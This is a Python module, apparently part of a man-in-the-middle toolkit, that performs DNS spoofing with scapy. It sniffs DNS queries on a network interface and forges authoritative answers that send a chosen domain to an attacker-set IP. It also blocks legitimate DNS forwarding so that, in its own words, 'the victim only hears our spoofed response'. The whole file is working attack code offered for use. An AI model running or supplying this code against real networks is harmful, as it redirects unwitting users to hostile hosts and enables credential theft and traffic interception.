import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_dns_blocking

# Track last log time to prevent console flooding
LOG_COOLDOWN = {} 

def dns_spoofer(packet):
    # Stop processing immediately if the stop signal is set
    if STOP_EVENT.is_set(): 
        return
    
    # Filter for standard DNS queries (qr=0) containing a DNS layer
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        try:
            # Decode the requested domain name
            qname = packet[DNSQR].qname.decode('utf-8')
            
            target_domain = STATUS.get("dns_domain")
            fake_ip = STATUS.get("dns_ip")
            
            if target_domain and target_domain in qname:
                # Rate limit logging to avoid freezing the UI with too many updates
                current_time = time.time()
                last_log = LOG_COOLDOWN.get(qname, 0)
                
                if current_time - last_log > 3:
                    log_msg(f"[DNS] SPOOFED: {qname} -> {fake_ip}")
                    LOG_COOLDOWN[qname] = current_time

                # [Image of DNS packet structure with IP UDP and DNS layers]
                # Construct the spoofed response: Swap Src/Dst IP and Ports
                scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                
                # Create DNS Answer Record (AN) pointing to our fake IP
                scapy_dns = scapy.DNS(
                    id=packet[scapy.DNS].id, qr=1, aa=1, 
                    qd=packet[scapy.DNS].qd, 
                    an=scapy.DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                )
                
                spoofed_pkt = scapy_ip / scapy_udp / scapy_dns
                
                # Delete checksums/lengths to force Scapy to recalculate them automatically
                del spoofed_pkt[scapy.IP].len
                del spoofed_pkt[scapy.IP].chksum
                del spoofed_pkt[scapy.UDP].len
                del spoofed_pkt[scapy.UDP].chksum
                
                # Inject the forged packet into the network
                scapy.send(spoofed_pkt, verbose=False, iface=STATUS["interface"])
                
        except: pass

def start_dns_spoofing():
    try:
        log_msg("[CONFIG] DNS Forwarding: DISABLED (Intercepting requests)")
        # Block legitimate DNS forwarding so the victim only hears our spoofed response
        set_dns_blocking(True) 
        scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())
    finally:
        # Restore normal traffic flow
        set_dns_blocking(False)